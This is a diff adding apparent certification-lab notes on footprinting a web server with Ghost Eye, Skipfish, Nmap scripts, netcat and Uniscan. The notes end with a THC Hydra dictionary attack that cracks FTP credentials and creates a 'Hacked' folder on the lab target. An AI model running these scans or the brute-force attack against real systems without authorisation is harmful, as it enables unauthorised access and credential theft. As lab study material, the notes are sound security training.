@@ -1,1 +1,71 @@
+********************Footprint the web server***************
+
+<<Information gathering using Ghost Eye>>
+terminal 
+cd ghost_eye
+pip3 install -r requirements.txt
+python3 ghost_eye.py
+Type 1 for the Enter your choice:
+enter target name
+type 2 and press Enter to perform DNS Lookup
+Enter Domain or IP Address
+Type 6 in the Enter your choice
+Enter Domain or IP Address
+
+<<Perform web server reconnaissance using Skipfish>>
+terminal
+skipfish -o /root/test -S /usr/share/skipfish/dictionaries/complete.wl http://[IP Address of Windows Server 2016]:8080
+enter
+
+<<Footprint a web server using the httprecon Tool>>
+right-click httprecon.exe
+click Run as administrator 
+
+
+<<Footprint a web server using ID Serve>>
+
+<<Footprint a web server using Netcat and Telnet>>
+nc -vv www.test.com 80 
+type GET / HTTP/1.0 and press Enter twice
+
+perform banner grabbing using telnet
+telnet www.test.com 80 
+GET / HTTP/1.0 and press Enter twice. 
+
+
+<<Enumerate web server information using Nmap Scripting Engine (NSE)>>
+nmap -sV --script=http-enum [target website] (to Enumerate the directories used by web servers and web applications)
+
+nmap --script hostmap-bfk -script-args hostmap-bfk.prefix=hostmap- www.test.com (to discover the hostnames)
+
+nmap --script http-trace -d www.test.com (to perform HTTP trace on the targeted domain)
+
+nmap -p80 --script http-waf-detect www.test.com (to check whether Web Application Firewall is configured on the target host or domain)
+
+<<Uniscan web server fingerprinting in Parrot Security>>
+
+uniscan -u http://127.0.0.1:8080/CEH -q
+
+uniscan -u http://10.10.10.16:8080/CEH -we (to  file check (robots.txt and sitemap.xml file)
+
+uniscan -u http://10.10.10.16:8080/CEH -d (-d for dynamic testing)
+------------------------------------------------------------------------------------------------------------------
+
+****************Perform a web server attack***************
+
+<<Crack FTP credentials using a Dictionary Attack>>
+
+perform a dictionary attack using the THC Hydra tool.
+
+check ftp port is open or not using nmap
+if open then try to connect with ftp server
+ftp target ip
+copy and paste wordlist file on desktop
+hydra -L /home/attacker/Desktop/Wordlists/Usernames.txt -P /home/attacker/Desktop/Wordlists/Passwords.txt ftp://[IP Address of Windows 10]
+mkdir <folder name> (to remotely create a directory named Hacked on the targat machine through the ftp terminal.)
+help
+quit
+
+----------------------------------------------------------------------------------------------------------------
+
 
